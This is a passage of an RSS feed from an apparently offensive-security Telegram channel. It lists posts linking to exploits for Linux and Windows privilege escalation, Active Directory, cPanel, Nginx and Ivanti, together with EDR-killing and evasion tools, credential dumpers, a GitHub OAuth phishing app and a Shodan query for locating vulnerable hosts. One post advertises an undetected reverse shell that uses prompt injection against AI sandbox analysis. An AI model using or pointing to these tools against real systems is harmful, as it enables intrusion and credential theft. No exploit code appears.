+[Media: Фото]</description><pubDate>Fri, 26 Jun 2026 09:02:24 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_380</guid></item><item><title>🔑 Onelogon: Taking over Active Directory Accounts via Netlogon</title><link>https://t.me/P0x3k_1N73LL1G3NC3/378</link><description>🔑 Onelogon: Taking over Active Directory Accounts via Netlogon
+We analyzed Netlogon, bypassed the Zerologon patch, resulting in a full auth bypass. An attacker can leverage this to compromise computer accounts, or even the entire AD. Non-standard config must be present tho
+Exploit: https://github.com/rub-softsec/onelogon
+https://github.com/Pennyw0rth/NetExec/pull/1291
+From: https://x.com/al3x_n3ff/status/2069482623672435049?s=46
+
+[Media: Фото]</description><pubDate>Tue, 23 Jun 2026 18:34:34 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_378</guid></item><item><title>PhantomCtx</title><link>https://t.me/P0x3k_1N73LL1G3NC3/376</link><description>PhantomCtx
+A tool that automates Activation Context hijacking with the objective of loading an arbitrary DLL into the vast majority of signed executables (e.g. Microsoft, Adobe, Mozilla).
+The loader is presented as a modern alternative to traditional DLL Hijacking &amp; Sideloading: unlike conventional approaches, it does not require a vulnerable binary. The technique can be performed as long as the target executable resolves a DLL through its Import Address Table (IAT) or, in the worst case, via LoadLibrary without an absolute path.
+For a deeper dive into how it works internally and how it evades aggressive EDR solutions, check out the post on my technical blog.
+
+[Media: Фото]</description><pubDate>Sun, 21 Jun 2026 08:17:39 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_376</guid></item><item><title>https://t.me/boost/P0x3k_1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3/375</link><description>https://t.me/boost/P0x3k_1N73LL1G3NC3
+
+[Media: Фото]</description><pubDate>Sat, 20 Jun 2026 11:21:30 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_375</guid></item><item><title>Wasmforge</title><link>https://t.me/P0x3k_1N73LL1G3NC3/374</link><description>Wasmforge
+WasmForge compiles Go and C# programs to WebAssembly, then packages them as single native binaries. The resulting executables sandbox guest code inside a WASM runtime. From inside that sandbox, guests get transparent access to networking, raw sockets, Win32 APIs, and macOS framework APIs.
+You can write normal Go using net.Dial, net.Listen, or net/http. You can also migrate an existing .NET Framework C# project. Either way, the output is a single binary that runs on Windows or macOS, without requiring the user to make modifications to the guest source.
+Blog: https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/
+Go and C# build pipelines, the Wazero fork, the host shims, ghost profile builder, and everything necessary to support these capabilities.
+P.S. Compile an existing tool through a virtualizing recompiler to defeat static signatures.
+
+[Media: Фото]</description><pubDate>Fri, 19 Jun 2026 15:53:35 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_374</guid></item><item><title>DCOMIllusionist</title><link>https://t.me/P0x3k_1N73LL1G3NC3/373</link><description>DCOMIllusionist
+This tool enables remote code execution on a Windows machine, if you have administrative privileges. It leverages DCOM and the behavior of .NET DCOM servers, which automatically deserialize incoming objects. This makes it possible to execute arbitrary commands or load DLLs without writing to disk.
+
+[Media: Фото]</description><pubDate>Sun, 14 Jun 2026 18:42:51 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_373</guid></item><item><title>DPAPISnoop</title><link>https://t.me/P0x3k_1N73LL1G3NC3/370</link><description>DPAPISnoop
+A C# tool that extracts crackable DPAPI hashes from user MasterKeys and CREDHIST files from local paths and remote SMB shares.
+Blog: Old Passwords Die Hard: Abusing CREDHIST for offline credential recovery
+During Red Team engagements, Data Protection API (DPAPI) often arises when recovering browser material, extracting saved credentials, or acquiring and decrypting user Master Keys. While revisiting DPAPI internals, another artefact caught our attention: CREDHIST.
+When a user changes their password, old DPAPI blobs still need to be decrypted, so Windows maintains a password history chain that allows previous DPAPI password material to be recovered.
+After some investigation into CREDHIST, we have updated DPAPISnoop to support extracting CREDHIST entries into offline-crackable hash lines, alongside its existing Master Key hash extraction functionality. That change opened an interesting path where previously recovered passwords could now be used to identify a user’s password patterns over time.
+
+[Media: Фото]</description><pubDate>Fri, 12 Jun 2026 16:02:40 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_370</guid></item><item><title>Ivanti Sentry Pre-Auth RCE</title><link>https://t.me/P0x3k_1N73LL1G3NC3/366</link><description>Ivanti Sentry Pre-Auth RCE
+Ivanti Sentry authentication bypass and remote code execution vulnerabilities CVE-2026-10520, CVE-2026-10523.
+Blog: https://labs.watchtowr.com/more-evidence-that-words-dont-mean-what-we-thought-they-meant-ivanti-sentry-pre-auth-os-command-injection-cve-2026-10520/
+
+[Media: Фото]</description><pubDate>Thu, 11 Jun 2026 04:08:04 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_366</guid></item><item><title>RoguePlanet</title><link>https://t.me/P0x3k_1N73LL1G3NC3/365</link><description>RoguePlanet
+Windows Defender LPE. The exploit is a race condition, so it's a hit or miss. I have managed to get a 100% success rate on some machines while it struggled to work on others. The exploit has been tested in Windows 11 (Official channel + Canary) and Windows 10 with june 2026 patch installed. The PoC however does not work in Windows Server since standard users cannot mount an ISO image, I'm confident that all Windows Server versions are vulnerable as well, you just need to redesign the exploit.
+
+[Media: Фото]</description><pubDate>Wed, 10 Jun 2026 04:23:50 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_365</guid></item><item><title>Почти все каналы с полезным контентом, которые было интересно читать, перестали поддерживаться. Вот и прошла эпоха… С другой стороны, прекрасно понимаю, что их создатели стали серьезными людьми со...</title><link>https://t.me/P0x3k_1N73LL1G3NC3/364</link><description>Почти все каналы с полезным контентом, которые было интересно читать, перестали поддерживаться. Вот и прошла эпоха… С другой стороны, прекрасно понимаю, что их создатели стали серьезными людьми со множеством забот и выбор пал на более профитные темы. Отдельный респект всем тем, кто не продался, и не постил рекламу всякого шлака) Ходят слухи, что и тут многие нашли решение для своих горящих проектов или просто интересное на почитать. К чему это все? Если есть кайф выразить благодарность и поддержку то вот BTC адрес:
+bc1qslpr2rpffa4cqprhw6hzzjqdufmsc2svw87f4a
+
+[Media: Фото]</description><pubDate>Mon, 08 Jun 2026 20:55:19 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_364</guid></item><item><title>EDRChoker</title><link>https://t.me/P0x3k_1N73LL1G3NC3/363</link><description>EDRChoker
+Client–server EDRs have an inherent weakness: they must maintain server connectivity to be effective. When isolated from their server they lose much of their capability, and administrators can no longer collect or monitor logs from those agents. EDRChoker uses policy-based Quality of Service (QoS) to throttle EDR agents to the lowest bandwidth; when agents attempt to connect they will consistently time out due to the extremely low bandwidth.
+Blog: https://www.zerosalarium.com/2026/06/edrchoker-choking-telemetry-stream-block-edr.html
+In this article I present a technique for interfering with the client–server connection of an EDR. It’s different from EDR connection-blocking methods that use the Windows Firewall or the Windows Filtering Platform (WFP).
+
+[Media: Фото]</description><pubDate>Sun, 07 Jun 2026 11:11:26 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_363</guid></item><item><title>CVE-2026-0826: Unauthenticated stack buffer overflow in HP Poly VVX and Trio VoIP Phones (RCE as root)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/362</link><description>CVE-2026-0826: Unauthenticated stack buffer overflow in HP Poly VVX and Trio VoIP Phones (RCE as root)
+Vulnerable: VVX 150, VVX 250, VVX 350, and VVX 450), as well as Trio IP Conference series (Trio 8800, Trio 8500, and Trio 8300).
+Blog: https://www.rapid7.com/blog/post/ve-cve-2026-0826-critical-unauthenticated-stack-buffer-overflow-hp-poly-vvx-trio-voip-phones-fixed/
+
+[Media: Фото]</description><pubDate>Fri, 05 Jun 2026 06:38:15 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_362</guid></item><item><title>ssh-keysign-pwn — CVE-2026-46333</title><link>https://t.me/P0x3k_1N73LL1G3NC3/361</link><description>ssh-keysign-pwn — CVE-2026-46333
+A critical race condition flaw in pre-31e62c2ebbfd Linux kernels. Due to a window during process exit where the memory management structure is cleared before file descriptors are closed, an unprivileged user can use pidfd_getfd(2) to steal open file descriptors of privileged processes, enabling unauthorized reading of root-owned files.
+🔗 Exploit:
+https://github.com/0xdeadbeefnetwork/ssh-keysign-pwn
+🔗 Source:
+https://blog.qualys.com/vulnerabilities-threat-research/2026/05/20/cve-2026-46333-local-root-privilege-escalation-and-credential-disclosure-in-the-linux-kernel-ptrace-path
+#linux #kernel #privesc #racecondition #pidfd</description><pubDate>Mon, 01 Jun 2026 14:35:37 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_361</guid></item><item><title>The Phishy GitHub Issue Case</title><link>https://t.me/P0x3k_1N73LL1G3NC3/360</link><description>The Phishy GitHub Issue Case
+As I’m interested in initial access, and more specifically in phishing, I started looking for ways to target developers. What platform every developers uses today? You guessed it right (or just correctly read the title of this blog post) : GitHub. It is advertised as “a platform to create, store, manage and share code”. Every developer has a GitHub account and getting access to it mean getting access to their code. However, I was looking for lesser-know phishing technique, that doesn’t employ the usual Attacker-in-The-Middle approach. I stumbled upon several articles mentioning Fake Security Alerts using GitHub issues. Naturally, I decide to take a look at what it was. So let’s see how to setup this scenario for your next phishing campaign!
+MalGitApp
+A simple OAuth App designed to capture OAuth tokens when users authenticate through GitHub OAuth flow.
+
+[Media: Фото]</description><pubDate>Sun, 31 May 2026 17:01:15 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_360</guid></item><item><title>BYOVD and Looting LSASS in the Modern EDR Era</title><link>https://t.me/P0x3k_1N73LL1G3NC3/358</link><description>BYOVD and Looting LSASS in the Modern EDR Era
+In today’s post, we will be uncovering the internals of kernel driver vulnerabilities and how to leverage them via the BYOVD (Bring Your Own Vulnerable Driver) method of attack. We will use kernel access to disable PPL for the LSASS process and then proceed to dump the process to disk, XOR’ing it beforehand so it avoids detection by popular EDR solutions.
+https://github.com/g3tsyst3m/CodefromBlog/tree/main/2026-5-29-BYOVD%20and%20Looting%20LSASS%20in%20the%20Modern%20EDR%20Era
+
+[Media: Фото]</description><pubDate>Sat, 30 May 2026 14:23:12 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_358</guid></item><item><title>https://t.me/boost/P0x3k_1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3/357</link><description>https://t.me/boost/P0x3k_1N73LL1G3NC3
+
+[Media: Фото]</description><pubDate>Tue, 26 May 2026 10:00:28 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_357</guid></item><item><title>PhantomKiller</title><link>https://t.me/P0x3k_1N73LL1G3NC3/356</link><description>PhantomKiller
+Another BYOVD process killer. works on all EDR's. fully signed.
+Blog: https://medium.com/@jehadbudagga/phantom-killer-reverse-engineering-and-weaponizing-a-lenovo-driver-to-terminate-edr-processes-9191cd06374f
+
+[Media: Фото]</description><pubDate>Wed, 20 May 2026 08:28:00 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_356</guid></item><item><title>DirtyDecrypt / DirtyCBC</title><link>https://t.me/P0x3k_1N73LL1G3NC3/355</link><description>DirtyDecrypt / DirtyCBC
+A variant of CopyFail / DirtyFrag / Fragnesia. Linux kernel page-cache poisoning via AF_RXRPC RxGK decrypt-before-MAC and MSG_SPLICE_PAGES. Local privilege escalation to root.
+Blog: https://delphoslabs.com/blog/36142374-e1fe-80a9-9456-d3c64df81bd5/%20linux-rxgk-decrypt-mac
+
+[Media: Фото]</description><pubDate>Sun, 17 May 2026 07:43:46 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_355</guid></item><item><title>MiniPlasma (Windows unpatched LPE)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/354</link><description>MiniPlasma (Windows unpatched LPE)
+CVE-2020-17103 was apparently not patched or the patch was reversed, regardless this the PoC for an LPE in cldflt.sys, weaponized to spawn a SYSTEM shell. Success rate may vary since it's a race condition.
+
+[Media: Фото]</description><pubDate>Sat, 16 May 2026 09:05:26 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_354</guid></item><item><title>Nginx-Rift</title><link>https://t.me/P0x3k_1N73LL1G3NC3/353</link><description>Nginx-Rift
+CVE-2026-42945, a critical heap buffer overflow in NGINX's ngx_http_rewrite_module introduced in 2008. The bug enables unauthenticated remote code execution against servers using rewrite and set directives.
+Affected Versions:
+• NGINX Open Source: 0.6.27 – 1.30.0
+• NGINX Plus: R32 – R36
+
+[Media: Фото]</description><pubDate>Thu, 14 May 2026 10:54:21 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_353</guid></item><item><title>Fragnesia</title><link>https://t.me/P0x3k_1N73LL1G3NC3/352</link><description>Fragnesia
+Universal Linux local privilege escalation exploit. Fragnesia is a member of the Dirty Frag vulnerability class. This is a separate bug in the ESP/XFRM from dirtyfrag which has received its own patch. However, it is in the same surface and the mitigation is the same as for dirtyfrag.
+It abuses a logic bug in the Linux XFRM ESP-in-TCP subsystem to achieve arbitrary byte writes into the kernel page cache of read-only files, without requiring any race condition.
+
+[Media: Видео]</description><pubDate>Thu, 14 May 2026 10:30:26 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_352</guid></item><item><title>Boost channel, if you are a shower</title><link>https://t.me/P0x3k_1N73LL1G3NC3/351</link><description>Boost channel, if you are a shower
+
+[Media: Фото]</description><pubDate>Thu, 14 May 2026 06:47:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_351</guid></item><item><title>GreenPlasma</title><link>https://t.me/P0x3k_1N73LL1G3NC3/350</link><description>GreenPlasma
+Windows CTFMON Arbitrary Section Creation Elevation of Privileges Vulnerability
+
+[Media: Фото]</description><pubDate>Wed, 13 May 2026 03:21:55 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_350</guid></item><item><title>ReverseShell_2026_05.ps1</title><link>https://t.me/P0x3k_1N73LL1G3NC3/349</link><description>ReverseShell_2026_05.ps1
+ReverseShell with AI behaviour analysis bypass (prompt injection targeting sandbox analysis). As of May 4, 2026, undetected by all antivirus engines (0/61). These files typically remain usable for about 2–3 weeks before antivirus vendors begin flagging them.
+
+[Media: Фото]</description><pubDate>Fri, 08 May 2026 14:44:24 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_349</guid></item><item><title>Dirty Frag: Universal Linux LPE</title><link>https://t.me/P0x3k_1N73LL1G3NC3/348</link><description>Dirty Frag: Universal Linux LPE
+Obtain root privileges on major Linux distributions by chaining the xfrm-ESP Page-Cache Write vulnerability and the RxRPC Page-Cache Writevulnerability.
+Dirty Frag is a case that extends the bug class to which Dirty Pipe and Copy Fail belong. Because it is a deterministic logic bug that does not depend on a timing window, no race condition is required, the kernel does not panic when the exploit fails, and the success rate is very high.
+For detailed technical information and the timeline, see here.
+Tested on the following distribution versions:
+• Ubuntu 24.04.4: 6.17.0-23-generic
+• RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64
+• openSUSE Tumbleweed: 7.0.2-1-default
+• CentOS Stream 10: 6.12.0-224.el10.x86_64
+• AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64
+• Fedora 44: 6.19.14-300.fc44.x86_64
+
+[Media: Фото]</description><pubDate>Fri, 08 May 2026 05:33:51 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_348</guid></item><item><title>VeeamDumper-BOF</title><link>https://t.me/P0x3k_1N73LL1G3NC3/347</link><description>VeeamDumper-BOF
+A credential extraction BOF for Veeam Backup and Replication and Veeam One
+
+[Media: Фото]</description><pubDate>Wed, 06 May 2026 10:54:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_347</guid></item><item><title>MorphKatz</title><link>https://t.me/P0x3k_1N73LL1G3NC3/346</link><description>MorphKatz
+Rewrites x86-64 machine code inside PE executables and raw shellcode into semantically identical but byte-different equivalents. Same arithmetic, same observable EFLAGS effects, same control-flow — different bytes. That breaks byte-pattern detection (YARA rules, Defender signatures, Elastic rules, Sigma detection content) without changing what the code actually does.
+
+[Media: Видео]</description><pubDate>Wed, 06 May 2026 10:24:05 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_346</guid></item><item><title>EdgeSavedPasswordsDumper</title><link>https://t.me/P0x3k_1N73LL1G3NC3/345</link><description>EdgeSavedPasswordsDumper
+This tool was created to show that whenever a user stores credentials in Edge (using the Microsoft Password Manager feature, e.g. Autofill), ALL credentials are stored in plaintext in the parent Edge process memory. This is obviously problematic in a shared environment (e.g. on a terminal servers) as an attacker can access all Edge processes for all logged on and disconnected users, and dump their saved credentials. Microsoft has said that this is "by design" and thus won't fix this.
+Powershell version: https://gist.github.com/gitgotgitgotit/e28e02a02a358aef189c9c1ee426adf8
+Rust version: https://github.com/Whitecat18/Rust-for-Malware-Development/tree/main/Browser%20Creds%20Dumper/EdgeSavedPasswordsDumper
+
+[Media: Фото]</description><pubDate>Tue, 05 May 2026 15:09:54 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_345</guid></item><item><title>BYPASSING WINDOWS AUTHENTICATION REFLECTION MITIGATIONS FOR SYSTEM SHELLS - PART ②</title><link>https://t.me/P0x3k_1N73LL1G3NC3/343</link><description>BYPASSING WINDOWS AUTHENTICATION REFLECTION MITIGATIONS FOR SYSTEM SHELLS - PART ②
+A new arbitrary Kerberos coercion technique (CVE-2026-26128) that led to a complete bypass of the patch of CVE-2025-33073. This short-lived RCE was then transformed into a universal LPE attack.
+BYPASSING WINDOWS AUTHENTICATION REFLECTION MITIGATIONS FOR SYSTEM SHELLS - PART 1
+Abuse of a new feature of recent Windows versions, namely the ability to connect to SMB shares on arbitrary TCP ports, to achieve local privilege escalation (CVE-2026-24294) on up-to-date Windows Server 2025 machines.
+
+[Media: Фото]</description><pubDate>Sat, 02 May 2026 06:04:07 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_343</guid></item><item><title>Copy Fail— Linux LPE (CVE-2026-31431)  A logic bug in the Linux kernel's authencesncryptographic template. It lets an unprivileged local user trigger a deterministic, controlled 4-byte write into the...</title><link>https://t.me/P0x3k_1N73LL1G3NC3/342</link><description>Copy Fail— Linux LPE (CVE-2026-31431)  A logic bug in the Linux kernel's authencesncryptographic template. It lets an unprivileged local user trigger a deterministic, controlled 4-byte write into the page cache of any readable file on the system. A single…
+
+[Media: Фото]</description><pubDate>Thu, 30 Apr 2026 18:38:22 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_342</guid></item><item><title>Праздничный mood: Дропнуть в паблик крит эксплойтов и плотно набить будку шашлыком 😂</title><link>https://t.me/P0x3k_1N73LL1G3NC3/341</link><description>Праздничный mood: Дропнуть в паблик крит эксплойтов и плотно набить будку шашлыком 😂
+
+[Media: Фото]</description><pubDate>Thu, 30 Apr 2026 06:04:14 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_341</guid></item><item><title>CVE-2026-41940 cPanel/WHM Authentication Bypass</title><link>https://t.me/P0x3k_1N73LL1G3NC3/340</link><description>CVE-2026-41940 cPanel/WHM Authentication Bypass
+Exploit:
+• https://github.com/watchtowrlabs/watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py
+• https://github.com/assetnote/cpanel2shell-scanner
+Affected Software:
+• cPanel &amp; WHM 11.110.0 versions prior to fixed version 11.110.0.97
+• cPanel &amp; WHM 11.118.0 versions prior to fixed version 11.118.0.63
+• cPanel &amp; WHM 11.126.0 versions prior to fixed version 11.126.0.54
+• cPanel &amp; WHM 11.132.0 versions prior to fixed version 11.132.0.29
+• cPanel &amp; WHM 11.134.0 versions prior to fixed version 11.134.0.20
+• cPanel &amp; WHM 11.136.0 versions prior to fixed version 11.136.0.5
+• WP Squared 11.136.1 versions prior to fixed version 11.136.1.7
+Query: https://www.shodan.io/search?query=http.favicon.hash%3A-696182543
+
+[Media: Фото]</description><pubDate>Wed, 29 Apr 2026 20:56:43 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_340</guid></item><item><title>Copy Fail— Linux LPE (CVE-2026-31431)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/339</link><description>Copy Fail— Linux LPE (CVE-2026-31431)
+A logic bug in the Linux kernel's authencesncryptographic template. It lets an unprivileged local user trigger a deterministic, controlled 4-byte write into the page cache of any readable file on the system. A single 732-byte Python script can edit a setuid binary and obtain root on essentially all Linux distributions shipped since 2017.
+Exploit: https://github.com/theori-io/copy-fail-CVE-2026-31431
+A 732-byte PoC gets root on Ubuntu, Amazon Linux, RHEL, SUSE.
+
+[Media: Видео]</description><pubDate>Wed, 29 Apr 2026 19:58:04 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_339</guid></item><item><title>Remote Code Execution in GitHub.com and GitHub Enterprise Server (CVE-2026-3854)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/338</link><description>Remote Code Execution in GitHub.com and GitHub Enterprise Server (CVE-2026-3854)
+By exploiting an injection flaw in GitHub's internal protocol, any authenticated user could execute arbitrary commands on GitHub's backend servers with a single git push command - using nothing but a standard git client.
+
+[Media: Фото]</description><pubDate>Wed, 29 Apr 2026 06:52:37 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_338</guid></item><item><title>Message 337</title><link>https://t.me/P0x3k_1N73LL1G3NC3/337</link><description>
+
+[Media: Фото]</description><pubDate>Wed, 29 Apr 2026 06:49:58 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_337</guid></item><item><title>Message 336</title><link>https://t.me/P0x3k_1N73LL1G3NC3/336</link><description>
+
+[Media: Фото]</description><pubDate>Tue, 28 Apr 2026 15:51:36 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_336</guid></item><item><title>vss-fr2system</title><link>https://t.me/P0x3k_1N73LL1G3NC3/334</link><description>vss-fr2system
+Two small tools that turn an arbitrary file read bug on Windows into a SYSTEM shell.
+vss_freeze/ — creates a Volume Shadow Copy as a standard user, then holds it open so you have time to read the SAM/SECURITY/SYSTEM hives out of it
+fr2system/ — takes the hives you copied out, decrypts the local NTLM hashes offline, and pops a SYSTEM shell
+Together with any arb-file-read primitive that runs as SYSTEM (or anything that can read out of \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\...), this is a complete std-user → SYSTEM chain on a default Win10/Win11 box.
+
+[Media: Фото]</description><pubDate>Sat, 25 Apr 2026 12:51:46 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_334</guid></item><item><title>PhantomRPC: A new privilege escalation technique in Windows RPC</title><link>https://t.me/P0x3k_1N73LL1G3NC3/333</link><description>PhantomRPC: A new privilege escalation technique in Windows RPC
+If you have a service like RDP that exposes an RPC server, there many system services running as SYSTEM connect to it as RPC clients. If that service is turned off (RDP is off by default), it seems that any other process in Windows can expose the same RPC server using the same endpoint.
+Now all the RPC calls from that SYSTEM processes will come to this fake server and If the process that deployed the server has SeImpersonatePrivilege, it can escalate to SYSTEM by impersonate the RPC client.
+In the white paper below, I describe five exploit paths you can abuse.
+PhantomRPC (LPE 0-day)
+A research repository where you can find all the resources for PhantomRPC research that allows local privilege escalation.
+
+[Media: Видео]</description><pubDate>Wed, 29 Apr 2026 19:45:31 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_333</guid></item><item><title>DSCourier  The abuse of Windows Package Manager (WinGet) as a living-off-the-land binary is not a new concept. Prior research, such as Zero Salarium’s work, demonstrated that winget.exe can serve as...</title><link>https://t.me/P0x3k_1N73LL1G3NC3/332</link><description>DSCourier  The abuse of Windows Package Manager (WinGet) as a living-off-the-land binary is not a new concept. Prior research, such as Zero Salarium’s work, demonstrated that winget.exe can serve as a proxy for PowerShell execution through its configure subcommand.…
+
+[Media: Фото]</description><pubDate>Fri, 24 Apr 2026 07:17:16 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_332</guid></item><item><title>Pack2TheRoot — CVE-2026-41651</title><link>https://t.me/P0x3k_1N73LL1G3NC3/331</link><description>Pack2TheRoot — CVE-2026-41651
+TOCTOU race in PackageKit's transaction handler. Any local unprivileged user can install arbitrary packages as root with no authentication.
+Blog: https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
+
+[Media: Фото]</description><pubDate>Thu, 23 Apr 2026 16:08:18 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_331</guid></item><item><title>KeeLog</title><link>https://t.me/P0x3k_1N73LL1G3NC3/330</link><description>KeeLog
+Async BOF that captures the KeePass master password by monitoring for the unlock prompt window. When a locked KeePass database is detected, a low-level keyboard hook is installed and keystrokes are captured until the prompt window disappears by being submitted, cancelled or closeed. The captured buffer is then returned to the operator and automatically reconstructed into the master password.
+
+[Media: Фото]</description><pubDate>Thu, 23 Apr 2026 12:00:33 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_330</guid></item><item><title>Kerberos TGT Monitor BOF</title><link>https://t.me/P0x3k_1N73LL1G3NC3/328</link><description>Kerberos TGT Monitor BOF
+Async Beacon Object File (BOF) that monitors for Kerberos logon events and wakes up the agent whenever a new Kerberos TGT is captured. Similar to Rubeus' monitor command, this BOF is running indefinitely and periodically checks the LSA ticket cache on the system. When a new TGT is detected, it prints the ticket metadata and outputs a base64-encoded kirbi blob that can be used for lateral movement via pass-the-ticket attacks.
+
+[Media: Фото]</description><pubDate>Wed, 22 Apr 2026 18:22:31 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_328</guid></item><item><title>DLLHijackHunter</title><link>https://t.me/P0x3k_1N73LL1G3NC3/327</link><description>DLLHijackHunter
+Automated DLL Hijacking Discovery, Validation, and Confirmation. Turning local misconfigurations into weaponized, confirmed attack paths.
+
+[Media: Фото]</description><pubDate>Sun, 19 Apr 2026 18:12:42 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_327</guid></item><item><title>All Cats Are Beautiful😼</title><link>https://t.me/P0x3k_1N73LL1G3NC3/326</link><description>All Cats Are Beautiful😼
+
+[Media: Фото]</description><pubDate>Sat, 18 Apr 2026 13:18:05 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_326</guid></item><item><title>DSCourier</title><link>https://t.me/P0x3k_1N73LL1G3NC3/325</link><description>DSCourier
+The abuse of Windows Package Manager (WinGet) as a living-off-the-land binary is not a new concept. Prior research, such as Zero Salarium’s work, demonstrated that winget.exe can serve as a proxy for PowerShell execution through its configure subcommand.
+This post takes that concept further. Instead of calling winget.exe, we invoke the WinGet Configuration engine directly through its COM API, completely removing the CLI process from the execution chain. The result is arbitrary code execution inside a Microsoft-signed process with no winget.exe, no powershell.exe, and no cmd.exe in the process tree.
+Blog: DSCourier: Weaponizing DSC via WinGet COM API for EDR Evasive Execution
+P.S. This technique has has bypassed CrowdStrike Falcon, Microsoft Defender for Endpoint (MDE) and Elastic Security EDR.
+
+[Media: Видео]</description><pubDate>Sat, 18 Apr 2026 06:05:04 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_325</guid></item><item><title>SilentHarvest BOF</title><link>https://t.me/P0x3k_1N73LL1G3NC3/324</link><description>SilentHarvest BOF
+This is a BOF implementation of SilentNimvest project, which is in turn based on the SilentHarvest research. It's effectively another registry-only credential dumper, replicating hashdump capabilities as well as retrieving secrets stored in the HKLM\SECURITY\Policy\Secrets subkeys. Old capabilities with a "new" "sneaky" way of delivering. Only requires SeBackupPrivilege (e.g. Administrator, doesn't require SYSTEM as it would normally).
+
+[Media: Фото]</description><pubDate>Sat, 18 Apr 2026 04:43:46 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_324</guid></item><item><title>RedSun (Windows Defender LPE 0day)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/323</link><description>RedSun (Windows Defender LPE 0day)
+When Windows Defender realizes that a malicious file has a cloud tag, for whatever stupid and hilarious reason, the antivirus that's supposed to protect decides that it is a good idea to just rewrite the file it found again to it's original location. The PoC abuses this behaviour to overwrite system files and gain administrative privileges.
+
+[Media: Фото]</description><pubDate>Thu, 16 Apr 2026 12:19:31 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_323</guid></item><item><title>BlueSAM BOF</title><link>https://t.me/P0x3k_1N73LL1G3NC3/322</link><description>BlueSAM BOF
+A Cobalt Strike Beacon Object File adaptation of BlueSAM that attempts to obtain a copy of the SAM database through Windows Defender update/VSS behavior and process offline registry data from Beacon.
+
+[Media: Фото]</description><pubDate>Wed, 15 Apr 2026 12:47:19 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_322</guid></item><item><title>Message 321</title><link>https://t.me/P0x3k_1N73LL1G3NC3/321</link><description>
+
+[Media: Фото]</description><pubDate>Sun, 12 Apr 2026 07:29:43 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_321</guid></item><item><title>TailVNC</title><link>https://t.me/P0x3k_1N73LL1G3NC3/320</link><description>TailVNC
